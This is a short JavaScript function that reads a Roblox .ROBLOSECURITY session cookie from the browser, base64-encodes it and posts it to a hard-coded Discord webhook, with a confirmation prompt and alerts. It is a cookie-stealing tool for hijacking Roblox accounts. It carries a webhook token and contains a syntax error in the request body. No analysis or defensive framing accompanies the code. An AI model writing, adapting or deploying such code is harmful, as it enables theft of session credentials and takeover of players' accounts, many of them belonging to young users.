function grabCookie() {
  const cookies = document.cookie;
  const robloxCookie = cookies.split('; ').find(cookie => cookie.startsWith('.ROBLOSECURITY'));

  if (robloxCookie) {
    const cookieValue = robloxCookie.split('=')[1];
    const encodedCookie = btoa(cookieValue);
    const webhookUrl = 'https://discord.com/api/webhooks/1282821531961000017/56r3vhyWh-u82fbLYVZBS9CwFTPEbUvYPVCMzx50YFq2OqDi1mNqpF9lCVbt8lr7QA39';

    // Show loading indicator (add this to your HTML)
    document.getElementById('loading').style.display = 'block';

    // User interaction confirmation
    const confirmation = confirm('Are you sure you want to grab and send your Roblox cookie?');

    if (confirmation) {
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: Roblox cookie: ${encodedCookie} })
      })
        .then(response => {
          document.getElementById('loading').style.display = 'none'; // Hide loading indicator
          if (response.ok) {
            alert('Roblox cookie grabbed and sent to Discord successfully.');
          } else {
            alert('Failed to send Roblox cookie to Discord. Status: ' + response.status);
          }
        })
        .catch(error => {
          document.getElementById('loading').style.display = 'none'; // Hide loading indicator
          console.error('Error:', error);
          alert('An error occurred while grabbing and sending the Roblox cookie.');
        });
    } else {
      document.getElementById('loading').style.display = 'none'; // Hide loading indicator
      alert('Cookie grabbing canceled.');
    }
  } else {
    alert('Roblox cookie not found.');
  }
}
